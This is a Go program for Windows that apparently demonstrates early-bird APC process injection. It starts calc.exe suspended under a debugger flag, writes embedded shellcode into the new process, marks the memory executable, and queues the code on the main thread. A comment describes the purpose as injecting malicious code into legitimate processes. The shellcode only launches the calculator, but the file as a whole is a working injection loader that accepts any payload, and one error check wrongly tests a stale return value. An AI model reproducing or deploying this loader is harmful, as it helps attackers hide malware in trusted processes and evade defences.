package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	ntdll                  = syscall.NewLazyDLL("ntdll.dll")
	VirtualAllocEx         = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx       = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory     = kernel32.NewProc("WriteProcessMemory")
	CreateProcessA         = kernel32.NewProc("CreateProcessA")
	CreateRemoteThread     = kernel32.NewProc("CreateRemoteThread")
	QueueUserAPC           = kernel32.NewProc("QueueUserAPC")
	DebugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
	CloseHandle            = kernel32.NewProc("CloseHandle")
	SleepEx                = kernel32.NewProc("SleepEx")

	Startinf syscall.StartupInfo
	ProcInfo syscall.ProcessInformation
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	DEBUG_PROCESS          = 0x00000001
	INFINITE               = 0xFFFFFFFF
)

// Shellcode to start calc.exe
var ShellCode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
	0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
	0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
	0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
	0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
	0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
	0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

func main() {
	/*
    inject malicious code into legitimate processes. inserting malicious code into a process in its early stages
	*/
	cl := "C:\\Windows\\System32\\calc.exe"

	ret, _, err := CreateProcessA.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringBytePtr(cl))),
		0,
		0,
		0,
		DEBUG_PROCESS,
		0,
		0,
		uintptr(unsafe.Pointer(&Startinf)),
		uintptr(unsafe.Pointer(&ProcInfo)),
	)
	if ret == 0 {
		panic(fmt.Sprintf("CreateProcessA failed: %v", err))
	}

	hProcess := ProcInfo.Process
	hThread := ProcInfo.Thread

	addr, _, err := VirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(ShellCode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		panic(fmt.Sprintf("VirtualAllocEx failed: %v", err))
	}

	_, _, err = WriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&ShellCode[0])),
		uintptr(len(ShellCode)),
		0,
	)
	if ret == 0 {
		panic(fmt.Sprintf("WriteProcessMemory failed: %v", err))
	}

	var ldprotect uint32
	ret, _, err = VirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(len(ShellCode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&ldprotect)),
	)
	if ret == 0 {
		panic(fmt.Sprintf("VirtualProtectEx failed: %v", err))
	}

	ret, _, err = QueueUserAPC.Call(
		addr,
		uintptr(hThread),
		0,
	)
	if ret == 0 {
		panic(fmt.Sprintf("QueueUserAPC failed: %v", err))
	}

	ret, _, err = DebugActiveProcessStop.Call(uintptr(ProcInfo.ProcessId))
	if ret == 0 {
		panic(fmt.Sprintf("DebugActiveProcessStop failed: %v", err))
	}

	ret, _, err = CloseHandle.Call(uintptr(hProcess))
	if ret == 0 {
		panic(fmt.Sprintf("CloseHandle (process) failed: %v", err))
	}

	ret, _, err = CloseHandle.Call(uintptr(hThread))
	if ret == 0 {
		panic(fmt.Sprintf("CloseHandle (thread) failed: %v", err))
	}
}
